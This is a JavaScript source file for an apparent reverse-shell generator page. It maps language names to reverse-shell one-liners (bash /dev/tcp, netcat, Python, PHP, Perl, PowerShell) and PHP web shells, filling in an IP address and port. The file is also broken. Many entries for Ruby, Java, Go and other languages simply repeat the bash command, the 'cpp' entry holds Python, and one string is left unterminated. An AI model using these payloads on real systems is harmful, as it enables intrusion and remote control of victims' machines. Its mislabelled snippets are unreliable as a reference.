const ipAddress = '127.0.0.1';

function displayCode(language) {
    const port = document.getElementById('portInput').value;

    const codeSnippets = {
        'bash-i': `bash -i /dev/tcp/${ipAddress}/${port} 0>&1`,
        'bash196': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'bash-rl': `exec 5<>/dev/tcp/${ipAddress}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
        'bash5': `sh -i 5<> /dev/tcp/${ipAddress}/${port} 0<&5 1>&5 2>&5`,
        'bashudp': `sh -i >& /dev/udp/${ipAddress}/${port} 0>&1`,
        'nc-mkfifo': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f`,
        'nc-e': `nc ${ipAddress} ${port} -e sh`,
        'nc-c': `nc -c sh ${ipAddress} ${port}`,
        'nc.exe': `nc.exe ${ipAddress} ${port} -e sh`,
        'ncat-e': `ncat ${ipAddress} ${port} -e sh`,
        'ncat.exe': `ncat.exe ${ipAddress} ${port} -e sh`,
        'ncatudp': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 1.1.1.1 9999 >/tmp/f`,
        'curl': `C='curl -Ns telnet://1.1.1.1:9999'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null`,
        'rustcat': `rcat connect -s sh 1.1.1.1 9999`,
        'c': ``,
        'cwin': ``,
        'csharp-tcp': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'csharp-bash': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'cpp': `export RHOST="10.10.10.11";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`,
        'py1': `export RHOST="10.10.10.11";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`,
        'py2': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
        'py3': `export RHOST="10.10.10.11";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`,
        'phpcmds': `<html><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?></pre></body><script>document.getElementById("cmd").focus();</script></html>`,
        'phpcmd1': `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`,
        'phpcmd2': `php -r '$sock=fsockopen("10.10.10.11",4444);`sh <&3 >&3 2>&3`;'`,
        'phpexec': `php -r '$sock=fsockopen("10.10.10.11",4444);exec("sh <&3 >&3 2>&3");'`,
        'phpexecshell': `php -r '$sock=fsockopen("10.10.10.11",4444);shell_exec("sh <&3 >&3 2>&3");'`,
        'phpsystem': `php -r '$sock=fsockopen("10.10.10.11",4444);system("sh <&3 >&3 2>&3");'`,
        'phppass': `php -r '$sock=fsockopen("10.10.10.11",4444);passthru("sh <&3 >&3 2>&3");'`,
        'phppopen': `php -r '$sock=fsockopen("10.10.10.11",4444);popen("sh <&3 >&3 2>&3", "r");'`,
        'phpprocopen': `php -r '$sock=fsockopen("10.10.10.11",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,
        'perl': `perl -e 'use Socket;$i="10.10.10.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
        'perlnosh': `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
        'powershell1': `$LHOST = "10.10.10.11"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()`,
        'powershell2': `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        'powershell3': `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.11', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,
        'powershelltls': `$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.11', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()`,
        'powershellbase64': `,
        'ruby': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'rubynosh': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'nodejs1': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'nodejs2': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'java1': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'java2': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'java3': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'javaweb': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'javatwoway': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'javascript': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'groovy': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'telnet': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'zsh': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'lua1': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'lua2': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'go1': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'go2': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'awk': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'dart': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'crystalsys': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
        'crystalcode': `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`
    };

    const codeDisplay = document.querySelector('.code-display');
    codeDisplay.innerText = codeSnippets[language];
}
